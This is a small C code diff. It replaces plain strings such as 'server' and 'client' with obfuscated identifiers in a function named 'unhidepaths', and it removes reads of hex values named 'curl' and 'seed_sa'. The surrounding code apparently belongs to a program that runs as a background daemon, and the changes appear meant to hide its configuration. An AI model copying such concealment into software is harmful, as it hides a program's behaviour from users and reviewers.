@@ -114,8 +114,8 @@ void unhidepaths()
 {
     size_t len;
 
-    customreadhex("server", sockserver, &len);
-    customreadhex("client", sockclient, &len);
+    customreadhex(BdhuPmBf, sockserver, &len);
+    customreadhex(QynRlYS, sockclient, &len);
 }
 
 void process(void)
@@ -139,11 +139,6 @@ int main(void)
         char out[200];
         int len = 0;
 
-        customreadhex("curl", out, &len);
-        customreadhex("server", out, &len);
-        customreadhex("client", out, &len);
-        customreadhex("seed_sa", out, &len);
-        customreadhex("seed_cak", out, &len);
 #if DAEMON
         /* Our process ID and Session ID */
         pid_t pid, sid;
